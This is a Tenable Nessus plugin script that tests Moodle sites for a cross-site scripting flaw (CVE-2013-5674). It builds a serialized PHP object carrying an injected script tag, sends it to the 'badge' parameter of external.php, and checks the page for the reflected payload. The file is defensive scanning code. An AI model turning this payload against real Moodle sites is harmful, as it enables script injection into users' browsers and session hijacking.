#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(70023);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/05/16 14:12:49 $");

  script_cve_id("CVE-2013-5674");
  script_bugtraq_id(62412);
  script_osvdb_id(97357);

  script_name(english:"Moodle 'external.php' 'badge' Parameter XSS");
  script_summary(english:"Attempts to inject script code via the 'badge' parameter.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a cross-
site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Moodle installed on the remote host fails to properly
sanitize user-supplied input to the 'badge' parameter of the
'external.php' script. The application also fails to properly sanitize
serialized objects. An attacker can exploit these issues by crafting a
URL containing a serialized object that will inject arbitrary HTML or
script code in a users browser. By enticing a user to view this URL,
the attacker can exploit these flaws.

Note that the unserialization attack mentioned here can be used to
perform additional attacks; however, Nessus has only tested for a
cross-site scripting vulnerability.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/528652/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"https://moodle.org/mod/forum/discuss.php?d=238397");
  script_set_attribute(attribute:"see_also", value:"http://docs.moodle.org/dev/Moodle_2.5.2_release_notes");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 2.5.2 or later");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/09/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/09/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/09/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:moodle:moodle");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("moodle_detect.nasl");
  script_require_keys("www/PHP", "installed_sw/Moodle");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");
include("url_func.inc");

app = "Moodle";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

script = SCRIPT_NAME - ".nasl" + '-' + unixtime();
attack = '<script>alert("' +script+ '");</script><!--';

xss_test = 'O:8:"stdClass":2:{s:8:"imageUrl";s:0:"";s:9:"assertion";O:8:' +
  '"stdClass":1:{s:5:"badge";O:8:"stdClass":1:{s:6:"issuer";O:8:"stdClass":1' +
  ':{s:4:"name";s:' + strlen(attack) + ':"'+attack+'";}}}}';

exploit = test_cgi_xss(
  port     : port,
  dirs     : make_list(dir),
  cgi      : "/badges/external.php",
  qs       : 'badge=' + urlencode(str:xss_test),
  pass_str : 'lastcol" style="">' + attack,
  pass_re  : ">Issuer name<"
);

if (!exploit) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
